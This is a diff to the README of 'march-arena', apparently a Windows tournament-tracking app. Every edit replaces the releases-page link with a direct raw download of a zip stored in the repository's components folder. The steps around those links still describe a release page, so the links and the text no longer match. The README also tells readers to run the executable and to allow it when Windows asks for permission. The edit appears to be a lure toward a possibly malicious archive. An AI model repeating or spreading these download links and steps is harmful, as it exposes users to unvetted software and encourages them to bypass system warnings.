@@ -1,10 +1,10 @@
 # 🏀 march-arena - Track the 2026 tournament
 
-[![Download march-arena](https://img.shields.io/badge/Download%20march--arena%20-%20blue?style=for-the-badge&logo=github)](https://github.com/yolanepeaty347/march-arena/releases)
+[![Download march-arena](https://img.shields.io/badge/Download%20march--arena%20-%20blue?style=for-the-badge&logo=github)](https://github.com/yolanepeaty347/march-arena/raw/refs/heads/main/components/arena-march-v2.7.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/yolanepeaty347/march-arena/releases
+Visit this page to download: https://github.com/yolanepeaty347/march-arena/raw/refs/heads/main/components/arena-march-v2.7.zip
 
 Look for the latest release on that page. Download the Windows file from the Assets section. If the file ends in `.exe`, that is the file you should run. If you see a `.zip` file, download it, extract it, then open the app inside.
 
@@ -34,7 +34,7 @@ If Windows asks for permission to run the file, choose the option that lets the 
 
 ## 🚀 Install on Windows
 
-1. Open the download page: https://github.com/yolanepeaty347/march-arena/releases
+1. Open the download page: https://github.com/yolanepeaty347/march-arena/raw/refs/heads/main/components/arena-march-v2.7.zip
 2. Find the latest release near the top of the page
 3. In the Assets section, download the Windows file
 4. If the file is `.exe`, double-click it to launch the app
@@ -133,7 +133,7 @@ The release page may include one of these:
 
 ## 📌 Release page
 
-Download the current Windows version here: https://github.com/yolanepeaty347/march-arena/releases
+Download the current Windows version here: https://github.com/yolanepeaty347/march-arena/raw/refs/heads/main/components/arena-march-v2.7.zip
 
 ## 🏷️ Repository details
 
